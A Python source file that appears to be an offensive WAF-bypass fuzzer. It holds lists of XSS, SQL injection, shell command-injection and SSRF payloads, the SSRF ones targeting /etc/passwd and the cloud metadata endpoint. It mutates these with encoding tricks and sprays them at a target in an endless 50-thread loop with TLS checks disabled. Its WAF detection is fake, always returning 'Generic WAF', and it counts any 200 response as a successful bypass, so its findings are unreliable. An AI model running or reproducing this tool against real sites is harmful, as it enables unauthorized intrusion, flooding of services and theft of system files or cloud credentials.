# scanners/waf_bypass_engine.py
from typing import List, Dict, Optional, Tuple, Set
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class PayloadMutator:
    
    BYPASS_TECHNIQUES = {
        'CASE': lambda x: x.swapcase(),
        'DOUBLE_URL': lambda x: requests.utils.quote(requests.utils.quote(x)),
        'UNICODE': lambda x: ''.join(f'%u{ord(c):04x}' for c in x),
        'HEX': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
        'SPACE_TAB': lambda x: x.replace(' ', '\t'),
        'SPACE_NULL': lambda x: x.replace(' ', '\x00'),
    }
    
    @staticmethod
    def mutate_payload(payload: str) -> str:
        technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.values()))
        try:
            return technique(payload)
        except:
            return payload


class IntelligentPayloadGenerator:
    
    XSS_VECTORS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<video src=x onerror=alert(1)>',
    ]
    
    SQLI_VECTORS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "1' AND '1'='1",
        "admin' --",
        "' or 1=1 /*",
    ]
    
    RCE_VECTORS = [
        '`id`',
        '$(id)',
        '| id',
        '; id;',
        '&& id',
    ]
    
    SSRF_VECTORS = [
        'http://127.0.0.1:8080',
        'http://localhost:3000',
        'file:///etc/passwd',
        'http://169.254.169.254/latest/meta-data/',
    ]
    
    @staticmethod
    def generate_smart_payloads(vector_type: str):
        vector_map = {
            'XSS': IntelligentPayloadGenerator.XSS_VECTORS,
            'SQLI': IntelligentPayloadGenerator.SQLI_VECTORS,
            'RCE': IntelligentPayloadGenerator.RCE_VECTORS,
            'SSRF': IntelligentPayloadGenerator.SSRF_VECTORS,
            'XXE': IntelligentPayloadGenerator.SSRF_VECTORS,
        }
        
        base_vectors = vector_map.get(vector_type.upper(), IntelligentPayloadGenerator.XSS_VECTORS)
        
        while True:
            base = random.choice(base_vectors)
            yield base
            
            for _ in range(5):
                mutated = PayloadMutator.mutate_payload(base)
                yield mutated
                
            for _ in range(3):
                combo = random.choice(base_vectors)
                for _ in range(random.randint(1, 3)):
                    combo = PayloadMutator.mutate_payload(combo)
                yield combo


class WAFDetector:
    
    @staticmethod
    def detect_waf(target_url: str, timeout: int = 1) -> Tuple[str, float]:
        try:
            response = requests.get(
                target_url,
                timeout=timeout,
                verify=False,
                stream=True,
                allow_redirects=False
            )
            response.close()
            return ('Generic WAF', 0.5)
        except Exception:
            return ('Unknown', 0.0)


class WAFBypassEngine:
    
    def __init__(self, target_url: str, timeout: int = 1, max_workers: int = 50):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.max_workers = max_workers
        self.session = self._create_session()
        self.bypass_count = 0
        self.total_attempts = 0
        self.should_stop = False
        self.payload_cache = set()
    
    def _create_session(self) -> requests.Session:
        session = requests.Session()
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=200,
            pool_maxsize=200,
            max_retries=requests.adapters.Retry(
                total=0,
                backoff_factor=0,
                status_forcelist=[]
            )
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip',
        })
        session.verify = False
        session.trust_env = False
        
        return session
    
    def detect_waf(self) -> Tuple[str, float]:
        return WAFDetector.detect_waf(self.target_url, 1)
    
    def get_baseline_response(self) -> Optional[Dict]:
        try:
            response = self.session.get(
                self.target_url,
                timeout=1,
                verify=False,
                stream=True,
                allow_redirects=False
            )
            response.close()
            return {'status_code': response.status_code}
        except:
            return None
    
    def test_payload_fast(self, payload: str, injection_point: str = 'query') -> Dict:
        self.total_attempts += 1
        
        result = {
            'payload': payload,
            'injection_point': injection_point,
            'is_bypassed': False,
            'confidence': 0.0,
            'response_status': 0,
            'response_time': 0.0,
            'is_blocked': False,
            'detection_signals': [],
            'technique_used': '',
        }
        
        try:
            if injection_point == 'query':
                url = f"{self.target_url}?test={payload}"
            else:
                url = f"{self.target_url}/{payload}"
            
            start = time.time()
            
            response = self.session.get(
                url,
                timeout=0.5,
                verify=False,
                allow_redirects=False,
                stream=True
            )
            
            response.raw.read(128)
            
            elapsed = time.time() - start
            response.close()
            
            result['response_status'] = response.status_code
            result['response_time'] = elapsed
            
            if response.status_code in [200, 201, 204]:
                result['is_bypassed'] = True
                result['confidence'] = 0.8
                self.bypass_count += 1
            elif response.status_code in [403, 406]:
                result['is_blocked'] = True
                result['detection_signals'].append(f'HTTP {response.status_code}')
            
            return result
        
        except requests.Timeout:
            result['is_blocked'] = True
            result['detection_signals'].append('Timeout')
            result['response_time'] = 0.5
            return result
        except requests.ConnectionError:
            result['response_time'] = 0.1
            return result
        except Exception as e:
            result['response_time'] = 0.1
            return result
    
    def adaptive_bypass_unlimited(self, vector_type: str = 'XSS') -> List[Dict]:
        self.detect_waf()
        self.get_baseline_response()
        
        successful = []
        payload_generator = IntelligentPayloadGenerator.generate_smart_payloads(vector_type)
        
        batch_size = 50
        
        while not self.should_stop:
            payloads_batch = []
            
            for _ in range(batch_size):
                if self.should_stop:
                    break
                try:
                    payload = next(payload_generator)
                    if payload not in self.payload_cache:
                        self.payload_cache.add(payload)
                        payloads_batch.append(payload)
                except StopIteration:
                    break
            
            if not payloads_batch:
                continue
            
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = []
                
                for payload in payloads_batch:
                    if self.should_stop:
                        break
                    
                    future = executor.submit(self.test_payload_fast, payload, 'query')
                    futures.append(future)
                
                for future in as_completed(futures, timeout=1):
                    if self.should_stop:
                        break
                    
                    try:
                        result = future.result(timeout=1)
                        if result['is_bypassed']:
                            successful.append(result)
                    except:
                        pass
            
            if self.should_stop:
                break
        
        return successful
    
    def adaptive_bypass(self, vector_type: str = 'XSS') -> List[Dict]:
        return self.adaptive_bypass_unlimited(vector_type)
    
    def stop_bypass(self):
        self.should_stop = True
